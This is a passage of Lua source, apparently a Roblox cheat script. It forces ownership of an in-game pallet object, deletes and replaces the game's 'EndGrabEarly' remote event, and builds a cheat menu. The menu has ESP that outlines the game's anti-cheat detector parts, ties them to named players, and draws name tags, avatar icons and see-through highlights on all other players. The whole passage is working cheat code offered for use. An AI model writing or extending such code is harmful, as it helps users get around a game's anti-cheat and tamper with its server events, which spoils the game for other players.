							task.wait(0.1)
						end

						local v16 = _G.WS:FindFirstChild(_G.LP.Name .. "SpawnedInToys")

						while v16 do
							local flag7 = false

							for _, child in ipairs(v16:GetChildren()) do
								if child.Name == "PalletLightBrown" then
									pcall(function()
										_G.DestroyRemote:FireServer(child)
									end)

									flag7 = true
								end
							end

							if flag7 then
								task.wait(0.25)
								continue
							end
							break
						end

						permanentPallet.currentPallet = nil
						permanentPallet.myPalletId = nil
					end

					task.spawn(function()
						task.wait(2)

						while not _G.LP.Character or not _G.LP.Character:FindFirstChild("HumanoidRootPart") do
							task.wait(0.1)
						end

						while not _G.LP:FindFirstChild("CanSpawnToy") or not _G.SpawnRemote or not _G.SNO do
							task.wait(0.1)
						end

						task.wait()
						startPermanentPallet()
					end)

					_G.StartPermanentPallet = startPermanentPallet
					_G.StopPermanentPallet = stopPermanentPallet
					_G.ForcePallet = forcePallet
					_G.CheckOwnership = checkOwnership
					_G.TakeOwnership = takeOwnership

					task.spawn(function()
						task.wait(1)
						local str5 = _G.LP.Name .. "SpawnedInToys"
						local v16 = _G.WS:FindFirstChild(str5)

						while not v16 do
							_G.WS.ChildAdded:Wait()
							task.wait(0.25)
							v16 = _G.WS:FindFirstChild(str5)
						end

						v16.ChildAdded:Connect(function(child)
							if permanentPallet.enabled and child.Name == "PalletLightBrown" then
								if not permanentPallet.currentPallet or not permanentPallet.currentPallet.Parent then
									takeOwnership(child)
									forcePallet(child)
								end
							end
						end)

						v16.ChildRemoved:Connect(function(child)
							if permanentPallet.enabled and child.Name == "PalletLightBrown" then
								if child == permanentPallet.currentPallet or child == permanentPallet.myPalletId then
									permanentPallet.currentPallet = nil
									permanentPallet.myPalletId = nil
									permanentPallet.isAttached = false
								end
							end
						end)
					end)
				end

				local ReplicatedStorage = game:GetService("ReplicatedStorage")

				task.spawn(function()
					task.wait(3)
					local endGrabEarly = ReplicatedStorage.GrabEvents:FindFirstChild("EndGrabEarly")

					if endGrabEarly then
						endGrabEarly:Destroy()
					end

					local remoteEvent = Instance.new("RemoteEvent")
					remoteEvent.Name = "EndGrabEarly"
					remoteEvent.Parent = ReplicatedStorage.GrabEvents
				end)

				task.spawn(function()
					local lp = _G.LP
					if not lp then
						return
					end

					local function fn12(character)
						local function fn13()
							for _, child in ipairs(character:GetChildren()) do
								if child:IsA("BasePart") and child.Name ~= "CamPart" and child.Name ~= "HumanoidRootPart" then
									child.Transparency = 0
								elseif child:IsA("Accessory") and child.Name ~= "TypingKeyboardMyWorld" then
									for _, child2 in ipairs(child:GetChildren()) do
										if child2:IsA("BasePart") then
											child2.Transparency = 0
										end
									end
								end
							end
						end

						fn13()
						local torso = character:FindFirstChild("Torso") or character:FindFirstChild("UpperTorso")

						if torso then
							torso:GetPropertyChangedSignal("Transparency"):Connect(function()
								if torso.Transparency > 0 then
									task.defer(fn13)
								end
							end)
						end
					end

					lp.CharacterAdded:Connect(fn12)

					if lp.Character then
						fn12(lp.Character)
					end
				end)

				local v16
				v16 = _G.VisualTab:CreateBlock({ Name = "PCLD (Anti-Cheat) ESP", Side = "Left", ImageID = "120107856259332" })
				local lp
				lp = _G.LP or game:GetService("Players").LocalPlayer
				local ps
				ps = _G.PS or game:GetService("Players")
				local ws
				ws = _G.WS or workspace
				local rs
				rs = _G.RS or game:GetService("RunService")
				local tbl5
				tbl5 = {}
				local tbl6
				tbl6 = {}
				local flag7
				flag7 = false
				local surfaceTransparency
				surfaceTransparency = 0.75
				local transparency
				transparency = 0.5
				local color
				color = Color3.fromRGB(0, 0, 0)
				local color2
				color2 = Color3.fromRGB(255, 255, 255)
				local n25
				n25 = 15
				local flag8
				flag8 = true
				local n26
				n26 = 1
				local flag9, flag10, tbl7, tbl8, tbl9, tbl10, color3, textTransparency, color4, textStrokeTransparency
				local v17, connection, connection2, tbl11, tbl12, tbl13, tbl14, tbl15, flag11

				do
					local connection3 = nil
					flag9 = false
					local n27 = 0
					flag10 = false
					tbl7 = {}
					tbl8 = {}
					tbl9 = {}
					local tbl16 = { "PlayerCharacterLocationDetector", "CharacterDetector", "PartESP" }
					tbl10 = {}
					color3 = Color3.fromRGB(255, 255, 255)
					textTransparency = 0
					color4 = Color3.fromRGB(0, 0, 0)
					textStrokeTransparency = 0.2
					v17 = nil
					connection = nil
					connection2 = nil
					tbl11 = {}
					local tbl17 = {}
					tbl12 = {}
					tbl13 = {}
					tbl14 = {}
					tbl15 = {}
					local tbl18 = {}
					local n28 = 3
					local n29 = 0.5
					local n30 = 7
					local connection4 = nil
					local n31 = 0
					local n32 = 0
					flag11 = false

					local function fn12(arg)
						return math.abs(arg.X) < 0.1 and math.abs(arg.Y) < 0.1 and math.abs(arg.Z) < 0.1
					end

					local function fn13(arg)
						local v18 = fn12(arg.Position)
						local part2 = Instance.new("Part")
						part2.Name = "PCLD_SelectionPart"
						part2.Anchored = true
						part2.CanCollide = false
						part2.CanTouch = false
						part2.CanQuery = false
						part2.Transparency = 1
						part2.Size = arg.Size * n26
						part2.CFrame = arg.CFrame
						part2.Parent = ws
						local selectionBox = Instance.new("SelectionBox")
						selectionBox.Name = "PCLD_SelectionBox"
						selectionBox.Adornee = part2
						selectionBox.Color3 = color2
						selectionBox.SurfaceColor3 = color
						selectionBox.SurfaceTransparency = surfaceTransparency
						selectionBox.Transparency = transparency
						selectionBox.LineThickness = 0.02
						selectionBox.Visible = not v18
						selectionBox.Parent = part2

						table.insert(tbl6, {
							outline = selectionBox,
							outlineOrigin = part2,
							target = arg,
							currentCFrame = arg.CFrame,
							currentSize = arg.Size * n26,
						})
					end

					local function fn14()
						for _, v18 in pairs(tbl6) do
							if v18.outlineOrigin and v18.outlineOrigin.Parent then
								v18.outlineOrigin:Destroy()
							end
						end

						for _, v18 in pairs(tbl5) do
							pcall(function()
								v18:Disconnect()
							end)
						end

						if connection3 then
							connection3:Disconnect()
							connection3 = nil
						end

						tbl5 = {}
						tbl6 = {}
					end

					local function fn15()
						if not flag7 then
							return
						end
						fn14()
						local tbl19 = {}

						local function fn16(arg)
							if not arg or not arg.Parent or tbl19[arg] then
								return
							end
							local str5 = arg.Name:lower()

							if str5:find("playercharacterlocationdetector") or str5:find("characterdetector") or str5:find("partesp") then
								tbl19[arg] = true
								fn13(arg)
							end
						end

						for _, child in pairs(ws:GetChildren()) do
							if child:IsA("BasePart") then
								fn16(child)
							end
						end

						local connection5 = ws.DescendantAdded:Connect(function(descendant)
							if descendant:IsA("BasePart") then
								task.wait(0.1)
								fn16(descendant)
							end
						end)

						table.insert(tbl5, connection5)

						connection3 = rs.RenderStepped:Connect(function(deltaTime)
							local currentCamera = workspace.CurrentCamera
							local character = lp and lp.Character
							character = character and character:FindFirstChild("HumanoidRootPart")
							if not currentCamera then
								return
							end
							local position = character and character.Parent and character.Position or currentCamera.CFrame.Position

							if flag9 then
								n27 = (n27 + deltaTime * 0.5) % 1
								local color5 = Color3.fromHSV(n27, 1, 1)

								for _, v18 in pairs(tbl6) do
									if v18.outline then
										v18.outline.SurfaceColor3 = color5
									end
								end
							else
								for _, v18 in pairs(tbl6) do
									if v18.outline then
										v18.outline.SurfaceColor3 = color
									end
								end
							end

							for i = #tbl6, 1, -1 do
								local v18 = tbl6[i]

								if v18.target and v18.target.Parent and v18.outlineOrigin and v18.outlineOrigin.Parent then
									local position2 = v18.target.Position

									if fn12(position2) or (position - position2).Magnitude > 500 then
										v18.outline.Visible = false
									else
										v18.outline.Visible = true

										if flag8 then
											local n33 = math.min(1, deltaTime * n25)
											local n34 = v18.target.Size * n26
											v18.currentCFrame = v18.currentCFrame:Lerp(v18.target.CFrame, n33)
											v18.currentSize = v18.currentSize:Lerp(n34, n33)
											v18.outlineOrigin.CFrame = v18.currentCFrame
											v18.outlineOrigin.Size = v18.currentSize
										else
											v18.currentCFrame = v18.target.CFrame
											v18.currentSize = v18.target.Size * n26
											v18.outlineOrigin.CFrame = v18.target.CFrame
											v18.outlineOrigin.Size = v18.target.Size * n26
										end
									end
								else
									if v18.outlineOrigin and v18.outlineOrigin.Parent then
										v18.outlineOrigin:Destroy()
									end

									table.remove(tbl6, i)
								end
							end
						end)

						table.insert(tbl5, connection3)
					end

					local function fn16(arg)
						if not arg or not arg:IsA("BasePart") then
							return false
						end
						local str5 = arg.Name:lower()

						for _, v18 in ipairs(tbl16) do
							if str5:find(v18:lower()) then
								return true
							end
						end

						return false
					end

					local function fn17(arg)
						if not arg or not arg:IsA("BasePart") or not fn16(arg) then
							return
						end
						tbl12[arg] = true
					end

					local function fn18(arg)
						if not arg then
							return
						end
						local v18 = tbl15[arg] or tbl11[arg] or tbl8[arg]

						if v18 and tbl14[v18] == arg then
							tbl14[v18] = nil
						end

						tbl15[arg] = nil
						tbl11[arg] = nil
						tbl12[arg] = nil
						tbl9[arg] = nil
						tbl8[arg] = nil
						tbl10[arg] = nil
						tbl13[arg] = nil
					end

					local function fn19()
						local now2 = tick()

						for _, player in ipairs(ps:GetPlayers()) do
							local character = player.Character
							character = character and character:FindFirstChild("HumanoidRootPart")

							if character then
								local tbl19 = tbl18[player]

								if not tbl19 then
									tbl19 = {}
									tbl18[player] = tbl19
								end

								tbl19[#tbl19 + 1] = { pos = character.Position, time = now2 }
								local n33 = #tbl19

								while n33 >= 1 do
									if now2 - tbl19[n33].time > n28 then
										table.remove(tbl19, n33)
									end

									n33 -= 1
								end
							end
						end

						for k in pairs(tbl18) do
							if not k.Parent then
								tbl18[k] = nil
							end
						end
					end

					local function fn20()
						n32 += 1
						if connection4 then
							return
						end
						n31 = 0

						connection4 = rs.Heartbeat:Connect(function(deltaTime)
							n31 += deltaTime
							if n31 < 0.03 then
								return
							end
							n31 = 0
							fn19()
						end)
					end

					local function fn21()
						n32 = math.max(0, n32 - 1)

						if n32 <= 0 then
							if connection4 then
								connection4:Disconnect()
								connection4 = nil
							end

							n32 = 0
							tbl18 = {}
						end
					end

					local function fn22(arg, arg2)
						local n33 = n30 * n30

						for _, player in ipairs(ps:GetPlayers()) do
							if player == arg then
								continue
							end
							local character = player.Character
							character = character and character:FindFirstChild("HumanoidRootPart")

							if character then
								local n34 = character.Position - arg2
								if n34.X * n34.X + n34.Y * n34.Y + n34.Z * n34.Z <= n33 then
									return true
								end
							end
						end

						return false
					end

					local function fn23(arg, arg2)
						if not arg2 then
							return false
						end

						for i = #arg2, 1, -1 do
							local pos = arg2[i].pos
							if math.abs(arg.X - pos.X) <= n29 and math.abs(arg.Y - pos.Y) <= n29 and math.abs(arg.Z - pos.Z) <= n29 then
								return true
							end
						end

						return false
					end

					local function fn24(arg)
						if not arg or not arg.Parent then
							return nil
						end
						local v18 = tbl11[arg]
						if v18 and v18.Parent then
							return v18
						end

						if v18 and not v18.Parent then
							tbl11[arg] = nil
						end

						local position = arg.Position
						local v19 = nil
						local n33 = 0

						for _, player in ipairs(ps:GetPlayers()) do
							local character = player.Character
							character = character and character:FindFirstChild("HumanoidRootPart")

							if character then
								if fn23(position, tbl18[player]) then
									if tbl17[player] or not fn22(player, character.Position) then
										n33 += 1
										if n33 > 1 then
											return nil
										end
										v19 = player
										continue
									end
								end
							end
						end

						if n33 == 1 and v19 then
							tbl11[arg] = v19
							tbl17[v19] = true
							return v19
						end

						return nil
					end

					local function fn25(parent, arg)
						if not flag10 then
							return
						end

						if not parent or not parent.Parent then
							return
						end

						if tbl9[parent] then
							return
						end
						local v18 = tbl11[parent]
						if v18 and v18 ~= arg then
							return
						end
						local text = string.format("PCLD Name: [%s | %s]", arg.DisplayName, arg.Name)
						local billboardGui = Instance.new("BillboardGui")
						billboardGui.Name = "PCLD_NameTag"
						billboardGui.Size = UDim2.new(0, 300, 0, 30)
						billboardGui.StudsOffset = Vector3.new(0, -3.5, 0)
						billboardGui.AlwaysOnTop = true
						billboardGui.MaxDistance = 0
						billboardGui.Parent = parent
						local textLabel = Instance.new("TextLabel")
						textLabel.Name = "NameLabel"
						textLabel.Size = UDim2.new(1, 0, 1, 0)
						textLabel.BackgroundTransparency = 1
						textLabel.TextColor3 = color3
						textLabel.TextStrokeTransparency = textStrokeTransparency
						textLabel.TextStrokeColor3 = color4
						textLabel.TextTransparency = textTransparency
						textLabel.Font = Enum.Font.GothamBold
						textLabel.TextSize = 12
						textLabel.TextXAlignment = Enum.TextXAlignment.Center
						textLabel.TextYAlignment = Enum.TextYAlignment.Center
						textLabel.Text = text
						textLabel.Parent = billboardGui
						tbl10[parent] = { currentPos = parent.Position, targetPos = parent.Position, billboard = billboardGui, textLabel = textLabel }
						tbl8[parent] = arg
						tbl17[arg] = true
						tbl11[parent] = arg
						tbl13[parent] = nil
						tbl9[parent] = true

						table.insert(tbl7, parent.AncestryChanged:Connect(function()
							if not parent.Parent then
								fn18(parent)
							end
						end))
					end

					local function fn26()
						for k, v18 in pairs(tbl14) do
							if not k or not k.Parent or not v18 or not v18.Parent then
								if v18 then
									tbl15[v18] = nil
								end

								tbl14[k] = nil
							end
						end
					end

					local function fn27()
						if not flag10 then
							return
						end
						fn26()

						for k in pairs(tbl13) do
							if not k or not k.Parent then
								tbl13[k] = nil
							else
								local v18 = fn24(k)

								if v18 then
									fn25(k, v18)
								end
							end
						end
					end

					local function fn28()
						for _, v18 in pairs(tbl10) do
							if v18.textLabel then
								v18.textLabel.TextColor3 = color3
								v18.textLabel.TextTransparency = textTransparency
								v18.textLabel.TextStrokeColor3 = color4
								v18.textLabel.TextStrokeTransparency = textStrokeTransparency
							end
						end
					end

					local function fn29(arg)
						if not arg then
							return
						end
						local pcldNameTag = arg:FindFirstChild("PCLD_NameTag")

						if pcldNameTag then
							pcldNameTag:Destroy()
						end

						local v18 = tbl8[arg]

						if v18 and tbl14[v18] == arg then
							tbl14[v18] = nil
						end

						tbl15[arg] = nil
						tbl8[arg] = nil
						tbl10[arg] = nil
						tbl9[arg] = nil
					end

					local function fn30()
						for k in pairs(tbl8) do
							fn29(k)
						end

						tbl8 = {}
						tbl10 = {}
						tbl9 = {}
						tbl13 = {}

						for _, v18 in pairs(tbl7) do
							pcall(function()
								v18:Disconnect()
							end)
						end

						tbl7 = {}

						if v17 then
							v17:Disconnect()
							v17 = nil
						end

						if connection then
							connection:Disconnect()
							connection = nil
						end

						if connection2 then
							connection2:Disconnect()
							connection2 = nil
						end

						if flag11 then
							fn21()
							flag11 = false
						end
					end

					local function fn31()
						if not flag10 then
							return
						end
						fn30()
						tbl12 = {}

						for _, descendant in ipairs(ws:GetDescendants()) do
							if descendant:IsA("BasePart") and fn16(descendant) then
								fn17(descendant)
								tbl13[descendant] = true
							end
						end

						if not flag11 then
							fn20()
							flag11 = true
						end

						fn19()
						fn27()

						connection2 = ws.DescendantAdded:Connect(function(descendant)
							if descendant:IsA("BasePart") and fn16(descendant) then
								fn17(descendant)

								if not tbl9[descendant] then
									tbl13[descendant] = true
									local v18 = tbl11[descendant]

									if v18 and v18.Parent then
										fn25(descendant, v18)
									end
								end
							end
						end)

						table.insert(tbl7, connection2)

						local connection5 = ws.DescendantRemoving:Connect(function(descendant)
							if descendant:IsA("BasePart") and tbl12[descendant] then
								fn29(descendant)
								tbl13[descendant] = nil
								tbl11[descendant] = nil
								fn18(descendant)
							end
						end)

						table.insert(tbl7, connection5)

						connection = rs.Heartbeat:Connect(function()
							if not flag10 then
								return
							end
							fn27()
						end)

						table.insert(tbl7, connection)
					end

					v16:CreateToggle({
						Name = "PCLD ESP",
						Default = false,
						Flag = "PCLDEnabled",
						Callback = function(arg)
							flag7 = arg

							if arg then
								fn15()

								if flag10 then
									fn31()
								end
							else
								fn14()
								fn30()
							end
						end,
					})

					v16:CreateToggle({
						Name = "RGB PCLD Color",
						Default = false,
						Flag = "PCLDRGB",
						Callback = function(arg)
							flag9 = arg

							if not arg then
								for _, v18 in pairs(tbl6) do
									if v18.outline then
										v18.outline.SurfaceColor3 = color
									end
								end
							end
						end,
					})

					v16:CreateColorPicker({
						Name = "PCLD Color (Fill)",
						Default = Color3.fromRGB(0, 0, 0),
						Flag = "PCLDColor",
						Callback = function(surfaceColor3)
							color = surfaceColor3

							if not flag9 then
								for _, v18 in pairs(tbl6) do
									if v18.outline then
										v18.outline.SurfaceColor3 = surfaceColor3
									end
								end
							end
						end,
					})

					v16:CreateColorPicker({
						Name = "Outline Color",
						Default = Color3.fromRGB(255, 255, 255),
						Flag = "PCLDOutlineColor",
						Callback = function(color32)
							color2 = color32

							for _, v18 in pairs(tbl6) do
								if v18.outline then
									v18.outline.Color3 = color32
								end
							end
						end,
					})

					v16:CreateSlider({
						Name = "PCLD Transparency",
						Min = 0,
						Max = 1,
						Default = 0.75,
						Flag = "PCLDTransparency",
						Callback = function(arg)
							surfaceTransparency = arg

							for _, v18 in pairs(tbl6) do
								if v18.outline then
									v18.outline.SurfaceTransparency = surfaceTransparency
								end
							end
						end,
					})

					v16:CreateSlider({
						Name = "Outline Transparency",
						Min = 0,
						Max = 1,
						Default = 0.5,
						Flag = "PCLDOutlineTransparency",
						Callback = function(arg)
							transparency = arg

							for _, v18 in pairs(tbl6) do
								if v18.outline then
									v18.outline.Transparency = transparency
								end
							end
						end,
					})

					v16:CreateToggle({
						Name = "Enable Lerp [Smoothness]",
						Default = true,
						Flag = "PCLDLerp",
						Callback = function(arg)
							flag8 = arg
						end,
					})

					v16:CreateSlider({
						Name = "Lerp Speed",
						Min = 10,
						Max = 30,
						Default = 15,
						Flag = "PCLDLerpSpeed",
						Callback = function(arg)
							n25 = arg
						end,
					})

					v16:CreateSlider({
						Name = "PCLD Size Multiplier",
						Min = 0.7,
						Max = 1.3,
						Default = 1,
						Flag = "PCLDSizeMultiplier",
						Callback = function(arg)
							n26 = arg

							for _, v18 in pairs(tbl6) do
								if v18.target and v18.target.Parent then
									local currentSize = v18.target.Size * n26
									v18.currentSize = currentSize

									if v18.outlineOrigin then
										v18.outlineOrigin.Size = currentSize
									end
								end
							end
						end,
					})

					v16:CreateToggle({
						Name = "Name Tag PCLD Detector",
						Default = false,
						Flag = "PCLDNameTag",
						Callback = function(arg)
							flag10 = arg

							if arg then
								if flag7 then
									fn31()
								end
							else
								fn30()
							end
						end,
					})

					v16:CreateColorPicker({
						Name = "Name Tag Text Color",
						Default = Color3.fromRGB(255, 255, 255),
						Flag = "PCLDNameTagTextColor",
						Callback = function(arg)
							color3 = arg
							fn28()
						end,
					})

					v16:CreateSlider({
						Name = "Name Tag Text Transparency",
						Min = 0,
						Max = 1,
						Default = 0,
						Flag = "PCLDNameTagTextTransparency",
						Callback = function(arg)
							textTransparency = arg
							fn28()
						end,
					})

					v16:CreateColorPicker({
						Name = "Name Tag Outline Color",
						Default = Color3.fromRGB(0, 0, 0),
						Flag = "PCLDNameTagOutlineColor",
						Callback = function(arg)
							color4 = arg
							fn28()
						end,
					})

					v16:CreateSlider({
						Name = "Name Tag Outline Transparency",
						Min = 0,
						Max = 1,
						Default = 0.2,
						Flag = "PCLDNameTagOutlineTransparency",
						Callback = function(arg)
							textStrokeTransparency = arg
							fn28()
						end,
					})
				end

				local v18
				v18 = _G.VisualTab:CreateBlock({ Name = "Players ESP", Side = "Right", ImageID = "117259180607823" })
				local rs2

				do
					local lp2 = _G.LP
					local ps2 = _G.PS
					rs2 = _G.RS
					local tbl16 = {}
					local flag12 = false
					local n27 = 0
					local n28 = 5
					local color5 = Color3.fromRGB(255, 255, 255)
					local str5 = "GothamBold"
					local textSize = 15
					local flag13 = false
					local flag14 = false
					local color6 = Color3.fromRGB(255, 0, 0)
					local tbl17 = {}
					local connection3 = nil

					local tbl18 = {
						Gotham = Enum.Font.Gotham,
						GothamBold = Enum.Font.GothamBold,
						SourceSans = Enum.Font.SourceSans,
						SourceSansBold = Enum.Font.SourceSansBold,
						Oswald = Enum.Font.Oswald,
						Roboto = Enum.Font.Roboto,
						RobotoMono = Enum.Font.RobotoMono,
						Sarpanch = Enum.Font.Sarpanch,
						Ubuntu = Enum.Font.Ubuntu,
						Arial = Enum.Font.Arial,
						Cartoon = Enum.Font.Cartoon,
						Highway = Enum.Font.Highway,
						Nunito = Enum.Font.Nunito,
					}

					local function fn12(arg)
						local ok, result = pcall(function()
							return (ps2:GetUserThumbnailAsync(arg.UserId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size100x100))
						end)

						if ok and result then
							return result
						end
						return nil
					end

					local function createImageLabel(arg, parent)
						local imageLabel = Instance.new("ImageLabel")
						imageLabel.Name = "PlayerIcon"
						imageLabel.AnchorPoint = Vector2.new(0.5, 0)
						imageLabel.Position = UDim2.new(0.5, 0, 0, 0)
						imageLabel.Size = UDim2.new(0, 50, 0, 50)
						imageLabel.BackgroundTransparency = 1
						imageLabel.BorderSizePixel = 0
						imageLabel.Image = ""
						imageLabel.Parent = parent
						local uiCorner = Instance.new("UICorner")
						uiCorner.CornerRadius = UDim.new(1, 0)
						uiCorner.Parent = imageLabel

						task.spawn(function()
							local v19 = fn12(arg)

							if v19 and imageLabel and imageLabel.Parent then
								imageLabel.Image = v19
							end
						end)

						return imageLabel
					end

					local function fn13(arg)
						if arg == lp2 then
							return
						end

						if not flag12 and not flag13 then
							return
						end

						if tbl16[arg] then
							tbl16[arg]:Destroy()
							tbl16[arg] = nil
						end

						local character = arg.Character
						if not character then
							return
						end
						local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
						if not humanoidRootPart then
							return
						end
						local billboardGui = Instance.new("BillboardGui")
						billboardGui.Name = "ESP_NameTag"
						billboardGui.Adornee = humanoidRootPart
						billboardGui.StudsOffset = Vector3.new(0, n28, 0)
						billboardGui.AlwaysOnTop = true
						billboardGui.LightInfluence = 0
						billboardGui.MaxDistance = 10000
						billboardGui.ResetOnSpawn = false

						if flag13 and flag12 then
							billboardGui.Size = UDim2.new(0, 220, 0, 85)
						elseif flag13 then
							billboardGui.Size = UDim2.new(0, 220, 0, 50)
						else
							billboardGui.Size = UDim2.new(0, 220, 0, 40)
						end

						local frame2 = Instance.new("Frame")
						frame2.Name = "Container"
						frame2.Size = UDim2.new(1, 0, 1, 0)
						frame2.BackgroundTransparency = 1
						frame2.Parent = billboardGui

						if flag13 then
							createImageLabel(arg, frame2)
						end

						if flag12 then
							local textLabel = Instance.new("TextLabel")
							textLabel.Name = "NameLabel"
							textLabel.AnchorPoint = Vector2.new(0.5, 0)
							textLabel.Size = UDim2.new(1, 0, 0, 30)

							if flag13 then
								textLabel.Position = UDim2.new(0.5, 0, 0, 52)
							else
								textLabel.Position = UDim2.new(0.5, 0, 0, 0)
							end

							textLabel.BackgroundTransparency = 1
							textLabel.Text = arg.DisplayName .. " | " .. arg.Name
							textLabel.TextColor3 = color5
							textLabel.TextStrokeTransparency = 0
							textLabel.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
							textLabel.TextSize = textSize
							textLabel.Font = tbl18[str5] or Enum.Font.GothamBold
							textLabel.TextTransparency = n27 / 10
							textLabel.TextXAlignment = Enum.TextXAlignment.Center
							textLabel.Parent = frame2
						end

						billboardGui.Parent = character
						tbl16[arg] = billboardGui
					end

					local function fn14(arg)
						if tbl16[arg] then
							tbl16[arg]:Destroy()
							tbl16[arg] = nil
						end
					end

					local function fn15()
						for k in pairs(tbl16) do
							fn14(k)
						end

						if not flag12 and not flag13 then
							return
						end

						for _, player in pairs(ps2:GetPlayers()) do
							if player ~= lp2 then
								fn13(player)
							end
						end
					end

					local function fn16()
						if not flag14 then
							for k, v19 in pairs(tbl17) do
								if v19 then
									v19:Destroy()
								end

								tbl17[k] = nil
							end

							return
						end

						for _, player in pairs(ps2:GetPlayers()) do
							local character = player.Character
							local humanoid = character and character:FindFirstChildOfClass("Humanoid")

							if humanoid and humanoid.Health <= 0 then
								if not tbl17[player] or tbl17[player].Parent ~= character then
									if tbl17[player] then
										tbl17[player]:Destroy()
									end

									local highlight = Instance.new("Highlight")
									highlight.Name = "DeathHighlight"
									highlight.Adornee = character
									highlight.FillColor = color6
									highlight.FillTransparency = 0
									highlight.OutlineTransparency = 1
									highlight.Parent = character
									tbl17[player] = highlight
								else
									tbl17[player].FillColor = color6
								end
							elseif tbl17[player] then
								tbl17[player]:Destroy()
								tbl17[player] = nil
							end
						end
					end

					local function fn17(arg)
						task.wait(0.15)

						if flag12 or flag13 then
							fn13(arg)
						end
					end

					for _, player in pairs(ps2:GetPlayers()) do
						player.CharacterAdded:Connect(function()
							fn17(player)
						end)

						if player.Character and (flag12 or flag13) then
							fn13(player)
						end
					end

					ps2.PlayerAdded:Connect(function(player)
						player.CharacterAdded:Connect(function()
							fn17(player)
						end)

						local character = player.Character
						local v19

						if character then
							local v20 = flag12

							if flag12 then
								v19 = v20
							else
								v19 = flag13
							end
						else
							v19 = character
						end

						if v19 then
							task.wait(0.1)
							fn13(player)
						end
					end)

					ps2.PlayerRemoving:Connect(function(player)
						fn14(player)

						if tbl17[player] then
							tbl17[player]:Destroy()
							tbl17[player] = nil
						end
					end)

					lp2.CharacterAdded:Connect(function()
						task.wait(0.2)
						fn15()
					end)

					v18:CreateToggle({
						Name = "Enable Name ESP",
						Default = false,
						Flag = "ESPNameTags",
						Callback = function(arg)
							flag12 = arg
							fn15()
						end,
					})

					v18:CreateToggle({
						Name = "Show Player Icon",
						Default = false,
						Flag = "ESPPlayerIcon",
						Callback = function(arg)
							flag13 = arg
							fn15()
						end,
					})

					v18:CreateColorPicker({
						Name = "Name Tag Color",
						Default = Color3.fromRGB(255, 255, 255),
						Flag = "ESPNameColor",
						Callback = function(textColor3)
							color5 = textColor3

							for _, v19 in pairs(tbl16) do
								if v19 then
									local container = v19:FindFirstChild("Container")

									if container then
										local nameLabel = container:FindFirstChild("NameLabel")

										if nameLabel then
											nameLabel.TextColor3 = textColor3
										end
									end
								end
							end
						end,
					})

					v18:CreateSlider({
						Name = "Name Transparency",
						Min = 0,
						Max = 10,
						Default = 0,
						Flag = "ESPNameTransparency",
						Callback = function(arg)
							n27 = arg

							for _, v19 in pairs(tbl16) do
								if v19 then
									local container = v19:FindFirstChild("Container")

									if container then
										local nameLabel = container:FindFirstChild("NameLabel")

										if nameLabel then
											nameLabel.TextTransparency = arg / 10
										end
									end
								end
							end
						end,
					})

					v18:CreateDropdown({
						Name = "Font",
						Items = {
							"Gotham",
							"GothamBold",
							"SourceSans",
							"SourceSansBold",
							"Oswald",
							"Roboto",
							"RobotoMono",
							"Sarpanch",
							"Ubuntu",
							"Arial",
							"Cartoon",
							"Highway",
							"Nunito",
						},
						Default = "Highway",
						Flag = "ESPNameFont",
						Callback = function(arg)
							str5 = arg

							for _, v19 in pairs(tbl16) do
								if v19 then
									local container = v19:FindFirstChild("Container")

									if container then
										local nameLabel = container:FindFirstChild("NameLabel")

										if nameLabel then
											nameLabel.Font = tbl18[arg] or Enum.Font.GothamBold
										end
									end
								end
							end
						end,
					})

					v18:CreateSlider({
						Name = "Text Size",
						Min = 10,
						Max = 30,
						Default = 15,
						Flag = "ESPNameSize",
						Callback = function(textSize2)
							textSize = textSize2

							for _, v19 in pairs(tbl16) do
								if v19 then
									local container = v19:FindFirstChild("Container")

									if container then
										local nameLabel = container:FindFirstChild("NameLabel")

										if nameLabel then
											nameLabel.TextSize = textSize2
										end
									end
								end
							end
						end,
					})

					v18:CreateSlider({
						Name = "Name Tag Height",
						Min = 1,
						Max = 15,
						Default = 5,
						Flag = "ESPNameHeight",
						Callback = function(arg)
							n28 = arg

							for _, v19 in pairs(tbl16) do
								if v19 then
									v19.StudsOffset = Vector3.new(0, arg, 0)
								end
							end
						end,
					})

					v18:CreateToggle({
						Name = "Death Color Effect",
						Default = false,
						Flag = "ESPDeathEffect",
						Callback = function(arg)
							flag14 = arg

							if arg then
								if connection3 then
									connection3:Disconnect()
								end

								connection3 = rs2.Heartbeat:Connect(fn16)
							else
								if connection3 then
									connection3:Disconnect()
									connection3 = nil
								end

								for k, v19 in pairs(tbl17) do
									if v19 then
										v19:Destroy()
									end

									tbl17[k] = nil
								end
							end
						end,
					})

					v18:CreateColorPicker({
						Name = "Death Fill Color",
						Default = Color3.fromRGB(255, 0, 0),
						Flag = "ESPDeathFillColor",
						Callback = function(fillColor)
							color6 = fillColor

							for _, v19 in pairs(tbl17) do
								if v19 then
									v19.FillColor = fillColor
								end
							end
						end,
					})
				end

				do
					local v19 = _G.VisualTab:CreateBlock({ Name = "Player Highlights", Side = "Right", ImageID = "88610077537468" })
					local lp2 = _G.LP
					local ps2 = _G.PS
					local flag12 = false
					local color5 = Color3.fromRGB(255, 255, 255)
					local fillTransparency = 0.3
					local color6 = Color3.fromRGB(255, 255, 255)
					local outlineTransparency = 0
					local tbl16 = {}

					local function fn12(arg)
						if arg == lp2 then
							return
						end

						if tbl16[arg] then
							return
						end
						local character = arg.Character
						if not character then
							return
						end
						local highlight = Instance.new("Highlight")
						highlight.Name = "PlayerHighlight"
						highlight.Adornee = character
						highlight.FillColor = color5
						highlight.FillTransparency = fillTransparency
						highlight.OutlineColor = color6
						highlight.OutlineTransparency = outlineTransparency
						highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
						highlight.Parent = character
						tbl16[arg] = highlight
					end

					local function fn13(arg)
						local v20 = tbl16[arg]

						if v20 then
							v20:Destroy()
							tbl16[arg] = nil
						end
					end

					local function fn14()
						for k in pairs(tbl16) do
							fn13(k)
						end

						if not flag12 then
							return
						end

						for _, player in pairs(ps2:GetPlayers()) do
							if player ~= lp2 then
								fn12(player)
							end
						end
					end

					local function fn15(arg)
						fn13(arg)
					end

					local function fn16(arg)
						task.wait(0.1)
						tbl16[arg] = nil

						if flag12 then
							fn12(arg)
						end
					end

					local function fn17(arg)
						if arg == lp2 then
							return
						end

						if arg.Character and flag12 then
							fn12(arg)
						end

						arg.CharacterAdded:Connect(function()
							fn16(arg)
						end)

						arg.CharacterRemoving:Connect(function(character)
							fn15(arg, character)
						end)
					end

